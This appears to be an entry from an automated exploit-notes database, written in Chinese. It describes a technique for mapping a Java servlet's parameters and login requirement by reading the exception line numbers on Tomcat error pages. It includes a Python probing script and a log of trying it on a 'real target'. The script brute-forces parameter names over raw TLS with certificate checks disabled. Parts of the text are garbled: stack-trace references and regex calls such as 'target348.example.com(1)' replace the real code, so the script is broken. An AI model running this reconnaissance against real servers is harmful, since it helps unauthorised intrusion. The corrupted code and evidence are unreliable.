# 【技巧】Java 异常行号 oracle：用 Tomcat 错误页的 Class.java:NN 行号推进，零猜测定位 servlet 参数与鉴权门槛

- **code**: 技巧-java-异常行号-oracle-用-tomcat-错误页的-class.java-nn-行号推进-零猜测定位-servlet-参数与鉴权门槛
- **kind**: script
- **category**: methodology
- **language**: python
- **source**: self
- **verified**: 1
- **verified_note**: 在真实目标 `https://203.0.113.55/LHService/tp`（example.com.Service2_8.PutTp）上验证：裸请求 500 len=1201（user@example.com:40）→ userid+flag+head+type 500 len=1201（user@example.com:41）→ 390 参数钥匙串 500 len=1076（user@example.com:46）→ 追加 70 个 PutTp 专属字段名（tp/tpstr/pic/imgStr/imgName/photo/base64Str/filename…）行号一律停在 46 不动。另一处强证据：传 `type=head` 直接返回 `java.lang.NumberFormatException: For input string: "head"`，证明 `type` 确被 Integer.parseInt。据此判定该上传 servlet 需要登录态，避免了继续猜参数名的无效投入。证据文件 exploit58/e20_out.txt、exploit58/e21_out.txt。
- **path**: pocs/技巧-java-异常行号-oracle-用-tomcat-错误页的-class.java-nn-行号推进-零猜测定位-servlet-参数与鉴权门槛/java_line_oracle.py
- **tags**: java,servlet,参数发现,异常行号,oracle,judge,鉴权判定
- **created_at**: 2026-10-11T11:35:27.104Z
- **found_by**: exploit

## 描述

★ 通用技巧：对「会抛异常的老 Java servlet」做参数发现。原理 —— Tomcat 默认错误页会把 `<pre>` 里的完整 Java 异常栈（含精确行号 `Class.java:NN`）吐给客户端。于是：
① 先取「无参基准」的异常行号；
② 每加一个候选参数就重新取行号；
③ **行号前进 = 该参数被代码读取**（因为 parseInt/getParameter 链是按行推进的）；
④ 当所有候选参数用尽而行号仍停在同一行 ⇒ **那一行读的不是请求参数**（典型是 `session.getAttribute(...)`），即可判定「该端点需要登录态」，不必再猜参数名。
这个方法能在几十次请求内、用零猜测的方式判定一个未知 servlet 的参数面与鉴权门槛，比「猜参数名 / 大字典爆破」高效一个量级。
实测收益：`example.com.Service2_8.PutTp` 裸=`target347.example.com:40` NFE → `userid+flag+head+type`=`target347.example.com:41`（证明 `type` 确被 Integer.parseInt，传 `type=head` 直接回 `NumberFormatException: For input string: "head"`）→ 390 参数钥匙串=`target347.example.com:46` NPE → 再打 70 个专属字段名行号一律停在 46 ⇒ **判定 line 46 读 session 属性、该上传 servlet 需登录态**，一次判死。

## 用法

```
把 `line_of()` 里的 `PutTp` 换成目标类名（可从无参响应里拿到），`endpoint` 换成目标 servlet 路径，`BASE` 换成你的参数钥匙串。
流程：
1) `python oracle.py` 先打印裸请求与钥匙串请求的行号；
2) 在 `CANDS` 里放候选参数名，跑一遍看哪些推进行号；
3) 行号卡住不动 ⇒ 该行读 session/属性，端点需要登录态（判死，别再猜参数名）。
判据速查：
· 行号前进  → 参数被读取（继续逼近）
· 行号不动  → 参数未被读取（换名字）
· 参数给了仍 NPE 且所有候选都试完 → 读的是 session 属性 ⇒ 需登录
· `NumberFormatException: For input string: "xxx"` → 直接告诉你这个参数被 parseInt 了（强证据）
```

## 正文

```
# -*- coding: utf-8 -*-
"""Java 异常行号 oracle —— 零猜测定位 servlet 参数与鉴权门槛
用法：改 endpoint / CLASS / BASE / CANDS 后直接跑。
"""
import sys, re, socket, ssl, os, json, time
for _k in ("http_proxy","https_proxy","all_proxy","HTTP_PROXY","HTTPS_PROXY","ALL_PROXY"):
    os.environ.pop(_k, None)
try: sys.stdout.reconfigure(encoding="utf-8", errors="replace")
except Exception: pass

# ============ 目标配置 ============
IP, PORT, SNI_HOST = "203.0.113.55", 443, "203.0.113.55"
endpoint = "/LHService/tp"
CLASS    = "PutTp"            # 从无参响应里看到的类名（<pre> 里的 Xxx.java:NN）
BASE     = ""                # 参数钥匙串：如 "a=1&b=1&c=1&..."（可留空）
# ==================================

UA = ("Mozilla/5.0 (Linux; Android 13; 23013RK75C) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/203.0.113.52 Mobile Safari/537.36")

def raw(method="GET", path="/", body=None, headers=None, timeout=20):
    """原生 socket + 手工 TLS；绝不读 http_proxy 环境变量"""
    hdr = {"Host": SNI_HOST, "User-Agent": UA, "Accept": "*/*",
           "Accept-Encoding": "identity", "Connection": "close"}
    if headers: hdr.update(headers)
    data = b""
    if body is not None:
        data = body.encode("utf-8") if isinstance(body, str) else body
        hdr.setdefault("Content-Type", "application/x-www-form-urlencoded")
        hdr["Content-Length"] = str(len(data))
    head = ("%s %s HTTP/1.1\r\n" % (method, path)
            + "".join("%s: %s\r\n" % (k, v) for k, v in hdr.items()) + "\r\n")
    s = socket.socket(); s.settimeout(timeout)
    s.connect((IP, PORT))
    if PORT in (443, 8443):
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
        try: ctx.set_ciphers("DEFAULT@SECLEVEL=1")
        except Exception: pass
        s = ctx.wrap_socket(s, server_hostname=SNI_HOST)
    s.sendall(head.encode("utf-8", "replace") + data)
    buf = b""
    while True:
        try: c = s.recv(4096)
        except socket.timeout: break
        if not c: break
        buf += c
    s.close()
    return buf.decode("utf-8", "replace")

def line_of(text, cls=None):
    """返回 (行号 or None, 异常首行, 是否 NFE/其它)"""
    cls = cls or CLASS
    m = re.search(cls + r"\.java:(\d+)", text)
    ex = re.search(r"<pre>\s*([^\r\n<]+)", text)
    exs = target348.example.com(1).strip() if ex else ""
    return (int(target22.example.com(1)) if m else None, exs, text)

def probe(tag, path, method="GET", body=None):
    t = raw(method, path, body)
    ln, exs, _ = line_of(t)
    ln2 = ln if ln is not None else ("OTHER" if "Exception" in t else "NOERR")
    print("  %-34s %-5s line=%-7s exc=%s" % (tag, method, ln2, exs[:90]), flush=True)
    return ln2

def build(d, base=None):
    base = BASE if base is None else base
    ks = set(d.keys())
    parts = [x for x in base.split("&") if x and x.split("=")[0] not in ks]
    parts += ["%s=%s" % (k, v) for k, v in d.items()]
    return endpoint + ("?" + "&".join(parts) if parts else "")

def main():
    print("=== 1) 基准行号 ===")
    bare   = probe("裸请求", endpoint)
    keyed  = probe("参数钥匙串", build({})) if BASE else None

    print("\n=== 2) 单参数推进扫描（行号前进 = 参数被读取）===")
    CANDS = ["userid","id","type","flag","head","base64","imgName","imgStr","name",
             "filename","fileName","path","dir","url","tp","pic","img","image",
             "username","token","sign","key","fid","start","page","num","size",
             "body","content","data","file","up","bz","cz","json"]
    ref = keyed if BASE else bare
    advanced = []
    for pn in CANDS:
        ln = probe("附加 " + pn, build({pn: "1"}))
        if ln != ref:
            advanced.append((pn, ln)); print("      ^^^ 推进！", flush=True)
        time.sleep(0.8)
    print("\n=== 3) 结论 ===")
    if advanced:
        print("  被读取的参数: %s" % advanced)
        print("  → 针对这些参数继续给真实值，逼近业务分支")
    else:
        print("  行号停在 %s 不动 ⇒ 该行读的是 session/属性（非请求参数）" % ref)
        print("  → 判定：该 servlet 需要登录态，停止猜参数名")

if __name__ == "__main__":
    main()

```
